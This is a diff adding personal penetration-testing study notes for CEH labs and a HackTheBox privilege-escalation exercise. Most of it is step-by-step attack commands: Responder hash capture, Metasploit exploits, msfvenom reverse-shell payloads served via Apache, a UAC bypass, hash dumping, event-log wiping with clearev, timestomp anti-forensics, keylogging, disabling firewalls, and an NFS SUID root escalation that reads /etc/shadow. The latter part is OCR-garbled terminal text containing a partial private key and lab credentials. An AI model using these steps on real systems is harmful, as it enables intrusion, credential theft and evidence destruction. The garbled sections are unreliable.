@@ -1460,3 +1460,1266 @@ A.() Open cryp tool , open the given file but maybe the question is complete for
 
 
 
+
+# Vuln Assessment
+
+#OPENVAS
+
+OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. Its capabilities include unauthenticated testing, authenticated testing, various high level and low-level Internet and industrial protocols, performance tuning for large-scale scans, and a powerful internal programming language to implement any vulnerability test. The actual security scanner is accompanied with a regularly updated feed of Network Vulnerability Tests (NVTs)—over 50,000 in total. 
+
+Run from Docker (Preferred) 
+
+Docker is by far the easiest of all three installation methods and only requires one command to be run to get the client started. For this installation procedure, you will need docker installed.  
+
+    PARROT : apt install docker.io 
+
+    docker run -d -p 443:443 --name openvas mikesplain/openvas 
+
+    Username: admin Password: admin 
+
+    Go to scan > task > new task  
+
+    Once you select New Task from the dropdown you will be met with a large pop-up with many options. We will break down each of the options sections and what they can be used for. 
+
+    To scope a new target, navigate to the star icon next to Scan Targets. 
+
+ 
+
+AGAIN TO RESTART : 
+
+    docker ps -a 
+
+    docker start <container_ID> 
+
+    Go to localhost. 
+
+
+#NESSUS
+
+    Goto https://www.tenable.com/products/nessus/nessus-essentials and register an account. : Find activation key in mail ACTIVATION CODE : 8TCA-E5DG-9UGR-DLUD-ACU7 
+
+    sudo dpkg -i <nessus_package_file.deb> 
+
+    sudo /bin/systemctl start nessusd.service 
+
+    Go to localhost in firefox  
+
+    Start scanning  
+
+ 
+
+FOR CEH PRACTICAL 
+
+    Windows : https://localhost:3384/ 
+
+    Admin , password as credentials 
+
+
+
+# System Hacking
+
+#Info gather , gain access , hack
+
+TASK 1: PERFORM ACTIVE ONLINE ATTACK TO CRACK THE SYSTEM’S PASSWORD USING RESPONDER 
+
+ 
+
+    Login to windows 11 using username Jason and Password qwerty 
+
+    Go to parrot os : sudo -I responder eth0 ( Check eth0 from ipconfig) 
+
+    Go to windows 11 and run : \\CEH-Tools 
+
+    Return to parrot os : We will see the hashes of username and password 
+
+    Default location of Responder : /usr/share/responder/logs 
+
+    Terminal : john <SMB_NTLM_txt.file> 
+
+    We can see the password qwert and usename Jason 
+
+ 
+
+ 
+
+ 
+
+TASK 2: AUDIT SYSTEM PASSWORDS USING L0PHTCRACK 
+
+ 
+
+    Here we are going to dump all the passwords of Windows Server 2022 ( ip : 10.10.1.22) 
+
+    Go to windows 11 and open L0phtCrack ( password of win 11 : Pa$$w0rd) 
+
+    Click Password Auditing Wizard > next 
+
+    Choose target system ensure windows is selected > next 
+
+    Windows import > remote machine radio button click > next 
+
+    In the Windows Import From Remote Machine (SMB) wizard, type in the below details: 
+
+    Host: 10.10.1.22 (IP address of the remote machine [Windows Server 2022]) 
+
+    Select the Use Specific User Credentials radio button. In the Credentials section, type the login credentials of the Windows Server 2022 machine (Username: Administrator; Password: Pa$$w0rd). 
+
+    If the machine is under a domain, enter the domain name in the Domain section. Here, Windows Server 2022 belongs to the CEH.com domain. 
+
+    click next proceed  
+
+    Choose audit type > select Through Password audit > next 
+
+    In Reporting option select Generate Report at End of Auditing and save csv file in desired location > next 
+
+    Click finish on summary 
+
+    L0phtCrack will show all passwords and might take some time 
+
+    Can click stop after successfully attaining weak and strong passwords 
+
+ 
+
+ 
+
+TASK 3: FIND VULNERABILITIES ON EXPLOIT SITES 
+
+ 
+
+    Go to https://www.exploit-db.com/ 
+
+    On left panel click Search EDB 
+
+    In platform select OS 
+
+    Click on any vulnerabilities 
+
+    We can find CVE ID , author , platform , type  
+
+    You can download and make changes using notepad or ++ 
+
+ 
+
+ 
+
+METASPLOIT AND WINDOWS 10 HACKING 
+
+ 
+
+    nmap –A –sC <targ_ip> 
+
+    sudo msfconsole then search ethernal 
+
+    use exploit/windows/smb/ms17_010_psexec  
+
+    If it wont show set windows/meterpreter/reverse_tcp then set the payload 
+
+    set RHOSTS <TARG> 
+
+    set LHOSTS <LOCAL> 
+
+    exploit 
+
+ 
+
+ 
+
+EXPLOIT THE FTP VSFTPD 2.3.4 VULNERABILITY 
+
+ 
+
+    msfconsole 
+
+    use exploit/unix/ftp/vsftpd_234_backdoor 
+
+    set RHOSTS <TARG> 
+
+    exploit 
+
+
+
+#Priv Esc
+
+TASK 1: ESCALATE PRIVILEGES USING PRIVILEGE ESCALATION TOOLS AND EXPLOIT CLIENT-SIDE VULNERABILITIES 
+
+ 
+
+    Go to parrot : msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<host_ip> -f exe > /home/attacker/Desktop/Exploit.exe > Enter. 
+
+    Exploit.exe will be saved as location /home/attacker/Desktop ( other loc maybe) 
+
+    Now this exploit is to be shared on target machine 
+
+    If you want to create a new directory to share the Exploit.exe file with the target machine and provide the permissions, use the below commands:  
+
+        Type mkdir /var/www/html/share and press Enter to create a shared folder 
+
+        Type chmod -R 755 /var/www/html/share and press Enter 
+
+        Type chown -R www-data:www-data /var/www/html/share and press Enter 
+
+    Type ls -la /var/www/html/ | grep share > Enter 
+
+    Copy : cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/ press Enter 
+
+    Type : service apache2 start > Enter 
+
+    Type : msfconsole 
+
+    Type : use exploit/multi/handler > Enter 
+
+    Now, issue the following commands in msfconsole:  
+
+         Type: set payload windows/meterpreter/reverse_tcp and press Enter to set a payload. 
+
+        Type: set LHOST <host_ip> and press Enter to set the localhost. 
+
+    To start the handler : exploit -j -z > Enter 
+
+    Now go to windows/<target_ip> login Admin , pass: Pa$$w0rd 
+
+    Browser : http://<host_ip>/share > enter 
+
+    Click Exploit.exe and download 
+
+    Double click and run Exploit.exe 
+
+    Return to parrot os : We will see meterpreter session open in terminal 
+
+    Type : sessions -i 1 
+
+    Type : getuid > Enter ( Observe that the Meterpreter session is running with normal user privileges (WINDOWS11\Admin)) 
+
+    • Now that you have gained access to the target system with normal user privileges, your next task is to perform privilege escalation to attain higher-level privileges in the target system. 
+
+    First, we will use privilege escalation tools (BeRoot), which allow you to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system. 
+
+    Now, we will copy the BeRoot tool on the host machine (Parrot Security), and then upload the tool onto the target machine (Windows 11) using the Meterpreter session. 
+
+    Minimize the Terminal window. Click the Places menu at the top of Desktop and click ceh-tools on 10.10.1.11 from the drop-down options. ( 10.10.1.11 is IP of target windows 11 machine ) 
+
+If ceh-tools on 10.10.1.11 option is not present then follow the below steps to access CEH-Tools folder: 
+
+    Click the Places menu present at the top of the Desktop and select Network from the drop-down options 
+
+    The Network window appears; press Ctrl+L. The Location field appears; type smb://10.10.1.11 and press Enter to access Windows 11 shared folders. 
+
+    The security pop-up appears; enter the Windows 11 machine credentials (Username: Admin and Password: Pa$$w0rd) and click Connect. 
+
+    The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder. 
+
+    CEH-Tools folder appears, navigate to CEHv12 Module 06 System Hacking\Privilege Escalation Tools and copy the BeRoot folder 
+
+    Paste BeRoot to Desktop 
+
+    Terminal meterpreter : upload /home/attacker/Desktop/BeRoot/beRoot.exe ( This command uploads the beRoot.exe file to the target system’s present working directory (here, Downloads)). 
+
+    Type : shell  
+
+    Type : beRoot.exe > Enter 
+
+    A result appears, displaying information about service names along with their permissions, keys, writable directories, locations, and other vital data. • You can further scroll down to view the information related to startup keys, task schedulers, WebClient vulnerabilities, and other items. 
+
+    In terminal type : exit ( to return to meterpreter session) 
+
+    Now we will use GhostPack Seatbelt tool to gather host information and perform security checks to find insecurities in the target system. 
+
+    Minimize the Terminal window. Click the Places menu at the top of Desktop and click ceh-tools on 10.10.1.11 from the drop-down options. 
+
+If ceh-tools on 10.10.1.11 option is not present then follow the below steps to access CEH-Tools folder: 
+
+    Click the Places menu present at the top of the Desktop and select Network from the drop-down options 
+
+     The Network window appears; press Ctrl+L. The Location field appears; type smb://10.10.1.11 and press Enter to access Windows 11 shared folders. 
+
+     The security pop-up appears; enter the Windows 11 machine credentials (Username: Admin and Password: Pa$$w0rd) and click Connect. 
+
+     The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder. 
+
+    CEH-Tools folder appears, navigate to CEHv12 Module 06 System Hacking\Github Tools and copy Seatbelt.exe file. Paste the copied file onto Desktop. 
+
+    Terminal type: upload /home/attacker/Desktop/Seatbelt.exe 
+
+    Type : shell 
+
+    Type: Seatbelt.exe -group=system ( to gather information about AMSIProviders, AntiVirus, AppLocker etc.) 
+
+    Type: Seatbelt.exe -group=user (to gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.) 
+
+    Type: Seatbelt.exe -group=misc ( to gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.) 
+
+    Apart we can use 
+
+ 
+https://labondemand.blob.core.windows.net/content/lab117714/2022-04-11_16-32-15.jpg
+
+ 
+
+    In terminal type : exit ( to return to meterpreter session) 
+
+    Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique. 
+
+    Now, let us check our current system privileges by executing the : run post/windows/gather/smart_hashdump command. ( You will not be able to execute commands (such as hashdump, which dumps the user account hashes located in the SAM file, or clearev, which clears the event logs remotely) that require administrative or root privileges.) 
+
+    The command fails to dump the hashes from the SAM file located on the Windows 11 machine and returns an error stating Insufficient privileges to dump hashes! 
+
+    Type : getsystem -t 1 (Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.) 
+
+    It will fail 
+
+    From the result, it is evident that the security configuration of the Windows 11 machine is blocking you from gaining unrestricted access to it. 
+
+    Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine. 
+
+In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit. 
+
+    In meterpreter : background 
+
+    type: use exploit/windows/local/bypassuac_fodhelper 
+
+    Here, you need to configure the exploit. To know which options you need to configure in the exploit, type show options and press Enter. The Module options section appears, displaying the requirement for the exploit. Observe that the SESSION option is required, but the Current Setting is empty. 
+
+    Type: set SESSION 1 
+
+    type: set payload windows/meterpreter/reverse_tcp 
+
+    The Payload options section displays the requirement for the payload. 
+
+Observe that: 
+
+    The LHOST option is required, but Current Setting is empty (here, you need to set the IP Address of the local host, (here, the Parrot Security machine) 
+
+     The EXITFUNC option is required, but Current Setting is already set to process, so ignore this option 
+
+    The LPORT option is required, but Current Setting is already set to port number 4444, so ignore this option 
+
+    To set the LHOST option, type set LHOST <host_ip> and press Enter. 
+
+    type: set TARGET 0 
+
+    Type : exploit 
+
+    As you can see, the BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine; you have now successfully completed a Meterpreter session. 
+
+    Type meterpreter : getuid 
+
+    type: getsystem -t 1 
+
+    Type : getuid ( The Meterpreter session is now running with system privileges (NT AUTHORITY\SYSTEM)) 
+
+    Type: run post/windows/gather/smart_hashdump ( To get passwords) 
+
+    You can now remotely execute commands such as clearev to clear the event logs that require administrative or root privileges. To do so, type clearev and press Enter. 
+
+ 
+
+ 
+
+ 
+
+TASK 2: HACK A WINDOWS MACHINE USING METASPLOIT AND PERFORM POST-EXPLOITATION USING METERPRETER 
+
+ 
+
+    Windows 11 : Admin, Pa$$w0rd 
+
+    Create a text file : Secret.txt in C:\Users\Admin\Downloads. = “My credit card account number is 123456789.”. 
+
+    Parrot : In cd (root) location : msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<host_ip> -f exe > /home/attacker/Desktop/Backdoor.exe and press Enter 
+
+    In the previous lab, we created a directory or shared folder (share) at the location (/var/www/html) and with the required access permission. We will use the same directory or shared folder (share) to share Backdoor.exe with the victim machine.  
+
+Note: If you want to create a new directory to share the Backdoor.exe file with the target machine and provide the permissions, use the below commands:  
+
+▪ Type mkdir /var/www/html/share and press Enter to create a shared folder  
+
+▪ Type chmod -R 755 /var/www/html/share and press Enter  
+
+▪ Type chown -R www-data:www-data /var/www/html/share and press Enter 
+
+    Copy : cp /home/attacker/Desktop/Backdoor.exe /var/www/html/share/  
+
+    Type : service apache2 start 
+
+    Type : msfconsole > use exploit/multi/handler 
+
+    ▪ Type: set payload windows/meterpreter/reverse_tcp and press Enter  
+
+         
+
+            Type: set LHOST 10.10.1.13 and press Enter  
+
+            Type: show options and press Enter; this lets you know the listening port 
+
+    Type : exploit -j -z 
+
+    Windows : http://<parrot_ip>/share 
+
+    Open the backdoor file 
+
+    Parrot : Inside Meterpreter : sessions -i 1 
+
+    type : sysinfo 
+
+    Type : ipconfig 
+
+    Type : getuid 
+
+    Type : pwd 
+
+    Type : cat secret.txt ( which we have saved ) 
+
+    Now, we will change the MACE attributes of the Secret.txt file. 
+
+Note: While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information. 
+
+Note: To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file. 
+
+    Type: timestomp Secret.txt -v ( TO OPEN MACE ATTRIBUTES ) 
+
+    To change the MACE value, type: timestomp Secret.txt -m “02/11/2018 08:10:03” and press Enter 
+
+    Type: cd C:/ 
+
+    Type : pwd 
+
+    Can use search command to locate anything  
+
+    Type: search -f pagefile.sys 
+
+    Type: keyscan_start  
+
+    Now, switch to the Windows 11 virtual machine, create a text file, and start typing something. 
+
+    Type: keyscan_dump (This dumps all captured keystrokes.) 
+
+    Type: idletime ( to display the amount of time for which the user has been idle on the remote system.) 
+
+    Type: shell ( Open shell in meterpreter ) 
+
+    Type: dir /a:h ( To to retrieve the directory names with hidden attributes.) 
+
+    Type: sc queryex type=service state=all (to list all the available services) 
+
+    Type: netsh firewall show state  
+
+    Type: netsh firewall show config  
+
+    Type: wmic /node:"" product get name,version,vendor 
+
+    Type: wmic cpu get 
+
+    Type: wmic useraccount get name,sid 
+
+    Type: wmic os where Primary='TRUE' reboot (to reboot the target system.) 
+
+    Apart from the aforementioned post exploitation commands, you can also use the following additional commands to perform more operations on the target system:  
+
+ 
+Post Exploitation Command net start or sto netsh advfirewall set currentprofile state off netsh advfirewall set allprofiles state off Description Starts/sto s a network service Turn off firewall service for current profile Turn off firewall service for all profiles findstr /E ".txt" > txt.txt findstr /E 'i.log" > log.txt findstr /E ".doc" > doc.txt Post Escalating Privileges Retrieves all the text files (needs privileged access) Retrieves all the log files Retrieves all the document files
+
+ 
+
+ 
+
+    Observe that the Meterpreter session also dies as soon as you shut down the victim machine. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Task 4: Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS 
+
+ 
+
+    Parrot : nmap –sV <target_ip> 
+
+    Port 2049 is open and nfs service is running on it. 
+
+    Terminal : sudo apt-get install nfs-common 
+
+    Type showmount -e <t_ip> and press Enter, to check if any share is available for mount in the target machine. 
+
+    We can see that the home directory is mountable. 
+
+    Type mkdir /tmp/nfs and press Enter to create nfs directory. 
+
+    Type sudo mount -t nfs <T_ip>:/home /tmp/nfs in the terminal and press Enter to mount the nfs directory on the target machine. 
+
+    Type cd /tmp/nfs and press Enter to navigate to nfs folder.  
+
+    Type sudo cp /bin/bash . in the terminal and press Enter. 
+
+    In the terminal, type sudo chmod +s bash and press Enter.  
+
+    Type ls -la bash and press Enter. 
+
+    To get the amount of free disk available type sudo df -h and 
+
+    Type ssh -l <user> <T_IP> 
+
+    In the <username>@<IP> password field enter toor and press Enter.  
+
+    In the terminal window type cd /home and then ls 
+
+    Type ./bash -p, to run bash in the target machine. 
+
+    Type id and whoami to check 
+
+    Now we have got root privileges on the target machine, we will install nano editor in the target machine so that we can exploit root access 
+
+    Type cp /bin/nano .  
+
+    Type chmod 4777 nano 
+
+    Type ls -la nano 
+
+    To navigate to home directory, type cd /home and press Enter. Now, type ls and press Enter to list the contents in home directory. 
+
+    To open the shadow file from where we can copy the hash of any user, type ./nano -p /etc/shadow and press Enter. 
+
+    /etc/shadow file opens showing the hashes of all users. 
+
+    You can copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users. 
+
+    Press ctrl+x to close the nano editor.  
+
+    In the terminal, type cat /etc/crontab and press Enter, to view the running cronjobs. 
+
+    Type find / -name "*.txt" -ls 2> /dev/null and press Enter to view all the .txt files on the system 
+
+    Type find / -perm -4000 -ls 2> /dev/null and press Enter to view the SUID executable binaries. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+YOUTUBE (PENTESTER GUY) 
+
+ 
+
+PART I : PRIV ESC BASIC 
+
+ 
+
+Horizontal privilege escalation 
+
+ 
+
+    Login using: ssh <name>@<t_IP> -p <port_given> 
+
+ 
+httqsi;academv.hackthebox.c 100% Started ChatGPT4 Comparvi' Import HTB ACADEMY Quest i ons youtube.com is now full screen authenticity cf can't be established. EcnsA key fingerprint is ¯Are you Sure you to continue connecting yes warning: Permanently added '[34.237.48.481:50706' to the list of knoun hosts. xelcome to Ubuntu 28.84.1 L TS (GNU/Linux 5.10.e-1E-amd64 Ch eat S h the belt;"" to complete this Section and earn Cubes' Reset rget Target: 94.237/18.850706 Life Left: 86 minutes ssH to 94237.4848 •aith user "user' • and password SSH into the server prey"ded credentials, and use the to specify port Once login. try to find a Way to move to to get the flag in ' txt'. Submit gain trytofinda get the 'lag in ' Submit your Hint • Documentation: • Management: • Support; https:/,'help.ubuntu.cun https;/,'landsca;e.carwnical_ ccm https;//ubuntu.comdadvantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the •unminimize• ccmand. The programs with the Llbuntu system are free software; the exact distribution for each program are described in the files in / usoshare/doc/*/cgpyright. Libuntu canes with ABSOLUTELY WARRANTY. to the extent penitted by applicable user 1 use rlpng -535045 -get tings tartedp rivesc- hzq19 -5b6695dcc4- zgvdd —$
+
+ 
+
+    Check for any password required while escalting for user 2 
+
+ 
+File Edit View Search Terminal Tabs Help Parrot Terminal Parrot Terminal user1@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:-$ sudo -l Matching Defaults entries for user 1 on ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd: env reset, mail badpass, secure : /bin\ : / snap/ bin User user 1 may run the following commands on ng-535€45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd: ( user2 . user2) NOPASSWD: / bin/ bash user1@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:-$ 0
+
+ 
+
+ 
+
+NOPASSWD : /bin/bash means no password required 
+
+    Permission is denied coz we are in user1 
+
+ 
+Parrot Terminal Parrot Terminal user1@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:-$ sudo -l Matching Defaults entries for user 1 on ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd: env reset, mail badpass, secure : /bin\ : / snap/ bin User user 1 may run the following commands on ng-535€45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd: ( user2 . user2) NOPASSWD: / bin/ bash user1@ng-535@45-gettingstartedprivesc-hzq19 -bash: / home/user2: Is a directory user1@ng-535@45-gettingstartedprivesc-hzq19 user1@ng-535@45-gettingstartedprivesc-hzq19 flag . txt rtedprivesc-hzq19 cat: flag. txt: Permission denied userl@ng userl@ng userl@ng userl@ng userl@ng -535045 -535045 -535045 -535045 -535045 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -z9vdd:-$ / home/user2 -z9vdd:-$ cd / home/user2 -z9vdd:/home/user2$ Is -z9vdd:/home/user2$ cat flag. txt -z9vdd:/home/user2$ cd \ -z9vdd : -$ -z9vdd : -$ -z9vdd : -$ • -$ claerl -z9vdd.
+
+ 
+
+    Open us bash access for user2 : sudo -u user2 /bin/bash 
+
+ 
+Parrot Terminal user2@ng-535€45 user2 user2@ng-535€45 user2@ng-535€45 user 1 user2 user2@ng-535€45 user2@ng-535€45 flag . txt use -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 -gettingstartedprivesc-hzq19 FTB{1473r41 m€v3m3n7 70 4n€7h3r u53r} use r2@ng-535045-gettingsta rtedprivesc-hzq19 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 -5b6695dcc4 Parrot Terminal -z9vdd:-$ sudo -u user2 / bin/ bash -z9vdd:/home/user1$ whoami -z9vdd:/home/user1$ cd -z9vdd:/home$ Is -z9vdd:/home$ cd user2 -z9vdd. -z9vdd:-$ cat flag. txt -z9vdd:
+
+ 
+
+NOW WE HAVE SUCCESSFULLY ESCALATED HORIZONTAL PRIV ESC 
+
+Vertical privilege escalation 
+
+Method 1 : Using id_rsa key 
+
+    Locate the id_rsa file. id_rsa is the private key 
+
+ 
+VI ew Parrot Terminal user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root$ Is -la drwxr-xr-x 1 Search I erminal Parrot Terminal user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root$ Is flag . txt user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root$ cat flag. txt cat: flag. txt: Permission denied total 32 drwxr-x -rwxr-x- -rwxr-x- -rwxr-x- drwxr-x -rwxr-x--- 1 root root root root root root root root user2 root user2 user2 user2 user2 user2 root 4096 4096 5 3106 161 4096 1309 33 Feb Sep Aug Dec Dec Feb Aug Feb 12 7 19 5 5 12 19 12 2021 18:32 2€2€ 2019 2019 2021 2€2€ . bash history . bashrc . profile . ssh . viminfo 2021 flag. txt user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root$ cd .ssh user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root/ . ssh$ Is authorized keys id rsa id_pa. pub : / root/ . ssh$ 1. Private 2. Pubic Key
+
+ 
+Parrot Terminal Parrot Terminal drwxr-x- -rwxr-x- - 1 root user2 4096 Feb 12 2021 .ssh - 1 root user2 1309 Aug 19 . viminfo 33 Feb 12 2021 flag. txt 1 root root user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root$ cd .ssh user2@ng-535@45-gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/root/ . ssh$ Is authorized keys id rsa id rsa. pub . ssh$ cat id rsa - -BEGIN OPENSSH PRIVATE KEY- b3B1bnNzaC1rZXktdj EAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAB1wAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAt3nX57BIZ2nSHY+aaj41Kt91yeLVNiFh7X€vQisxoPv9BjNppQxV PtQ8csvHq/GatgS080VyskZIRbWb7QvCQ17JsT+Pr4ieQayN10Dm6+i9F1hXyMc€VsAqMk €5z9YKStLma€iN6181Mr€dA163x€mtwRKeHvJR+EiMtUTIAX9++kQJmD9F31DSnLF4/dEy G4WQSAH7F8Jz30rRKLprBiDf27LSPgOJ6j80Ln4bsiacaWFB13+CqkXeGkecEHg5d1L4K+ aPDP2xzFB€d€c7kZ8AtogtD3UYdiVKuF5fzOPJxJ01Mk07UsrhAh€T6m1BJWR1jjUtHwSs ntrFfE5trYET5L+ov5WSi+tyBrAfCcg€vWIU78Ge/3h4zAG8KaGZProMUS1u3MbCf11uK/ EKQXxCN1yr7Gmci€pLi9k16A1vcJ1xXYHBtJg6anLntwYVxbwYgYXp2Ghj+GwPcj21i4fq ynRFP1fsy6zoSjN9C977hCh5JStT6Kf€1dM68BcHAAAFiA2zO€oNsztKAAAAB3NzaC1yc2 EAAAGBALd51+ewdWdp€h2Pmm0+JSrfZcni1TYhYe19L€1rMaD7/QYzaaUMVT7UPHLLx6vx mrYEqPKFcrJGSEW1m+UwkCOybE/j6+1nkGsjSKA5uvovRdYV8jHNFbAKjJNOc/WCkrS5m t1jepfNTK9HQCOt8dJrcESnh7yUfh1jLVE5QF/fvpECZg/Rd5Q€pyxeP3RMhuFkEgB+xfC c9zq€Si6awYg39uy€j4Dieo/Di5+G71mnG1hQZd/gqpF3hpHnBB40XSC+Cvmjwz9scxQdH dH05GfALa1LQ91GHYISrheX8zjycSTtTJK01LK4Q1dE+piASVkZY41LR8ErJ7axXxOba2B E+S/qL+VkovrcgawHwn1NL1tVO/Bnv94emBvCmhmT66DFEpbtzGwn5dbivxCkF8QjSMq+ xpn1tKS4vZNegNb3CZcV2BwbSYOmpy57cGFcW8GIGF6dhoY/hsD319i1uH6sp€RT9X7Mus 6EozfQve+4QoeSUrU+in9CHTOvAXBwAAAAMBAAEAAAGAMxEtv+YEd3kjq2ip4QJVE/7D9R 12p+9Ys2JRgghFsvoQLeanc/Hf1DH8dTM€6y2/EwRvBbmQ9//J4+Utdif8tDIJ9BSt6HyN F9hwG/dmzqij 4NiM7mxLrA2mcQ0/oJKBoNvcmGXEYkSHqQysAti2XDis rP2Clzh5CjMfPu Dj 1Kyc6g1/5i10SBeU110qQ/MzECf3xaMPgUh10Tr+ZmikmzsRM7QtAme3vkQ4rUYabVaD 2Gzidc1e1Af1TuY5kPf1BG2yFAd3EzddnZ6rvmZxsv2ng9u3Y4tKHNttPYBzoRWJOq1fx9 PyqNkT€c3sV4BdhjH5/65w7MtkufqF8pvMFeCyywJgRL/v€/+nzY5VN5dcoaxkd1Xai3DG 5/ sVv1iVLHh67UC7adYcj rN49g€S3y01W6/x6n+GcgCH8wHKHDvh5h€9j dmxDqY3A8jTit CeTUQKMIEp5ds€YKfzN1z41j7NpCv@€317CQwSESjVtYPKia17WvOFwMZqK/B9zxoxAAAA r8q1afg+nB+1qtu1Z pTErmbc2DHuoZp/kc58QrJe1sdPpXFGTcvM1k64LJ+dt9sWEToG1/VDF+Ps30vmeyzwg64 +Xj UNQ6k9VLZqd2M5 rhONefNxM+LKR4xj OEydSybFoD cSYINtEk6EW92xZBojJB7+4RGKh3+YNwvocvUkHWDEKADB07YAAADBAPRj /ZTM7ATS01€k TcHWJpTiaw80SWKbAmvqAtiWa rsM+NDIL6XHqeBL8QL+vczaJjtV94XQc/3ZBSao/Wf8E5 InrD4hdj
+
+ 
+
+    Copy the key in your file in your terminal 
+
+ 
+File Edit View Search Terminal Parrot Terminal nparrot@parrot -/HTB $nano id rsa• Tabs Help Parrot Terminal Parrot Terminal
+
+ 
+
+    Login using rsa key 
+
+Parrot Terminal — parrot@parrot L-/HTB $nano id rsa aparrot@parrot [-/HTB) $chmod id rsa —parrot@parrot (-/HTB) $ssh root@94.237.48.48 -i id rsa _arro The authenticity of host '94.237.48.48 (94.237.48.48) can't be established. ECDSA key fingerprint is SHA256:mWYrjUwqNf+IRfujiU8cZ3JptxPeZGP9sTgGbasQieQ. Are you sure you want to continue connecting (yes/no/ [fingerprint])? yes Warning: Permanently added '94.237.48.48' (ECDSA) to the list of known hosts. root@94.237.48.48: Permission denied (publickey) . parrot@parrot [-/HTBJ $ssh root@94.237.48.48 -p 5€7€6 -i id rsa Welcome to Ubuntu 2€.€4.1 L TS (GNU/Linux 5.1€.€-18-amd64 x86 64) * Documentation: https://help.ubuntu.com https : // landscape. canonical . com * Management: https : //ubuntu . com/advantage * Support: This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. root@ng-535045-gettingsta rtedp rivesc-hzq19-5b6695dcc4-
+
+ 
+Parrot Terminal Parrot Terminal rtedprivesc-hzq19 -5b6695dcc4 root rtedprivesc-hzq19 -5b6695dcc4 flag . txt rtedprivesc-hzq19 -5b6695dcc4 HTB{pr1v11363 35c41471€n 2 r€€7} rtedprivesc-hzq19 -5b6695dcc4 rtedprivesc-hzq19 -5b6695dcc4 -z9vdd:-# -z9vdd:-# -z9vdd:-# -z9vdd. -z9vdd:-# whoami Is cat flag. txt
+
+ 
+
+FINALLY GOT VERTICAL PRIV ESC 
+
+Method 2 : Manipulatiing authorized keys and creating own public and private key 
+
+ 
+Parrot Terminal Parrot Terminal logout Connection to 94.237.48.48 closed. FL parrot@parrotl [-/HTB) $ssh user1@94.237.48.48 -p 5€7€6 Password: Password: Welcome to Ubuntu 2€.€4.1 L TS (GNU/Linux 5.1€.€-18-amd64 x86 64) * Documentation: https://help.ubuntu.com https : // landscape. canonical . com * Management: https : //ubuntu . com/advantage * Support: This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. Last login: Thu user1@ng-535€45 -bash: cd: / root: -z9vdd:/root$ root ettin started... userl@ng user2@ng user2@ng user2@ng total drwxr-x d rwx r -rwxr-x- d rwx - -rwxr-x- drwxr-x -rwxr-x- -535045 -535045 -535045 -535045 sep 7 2023 from 1€.3€.12.33 -gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:-$ cd / root Permission denied -gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:-$ sudo -u user2 / bin/ bash -gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:/home/user1$ cd \ -gettingstartedprivesc-hzq19-5b6695dcc4-z9vdd:-$ cd / root -gettingsta rtedp rivesc- hzq19 -5b6695dcc4- z9vdd : / root$ Is -la -rwxr-x--- 1 root 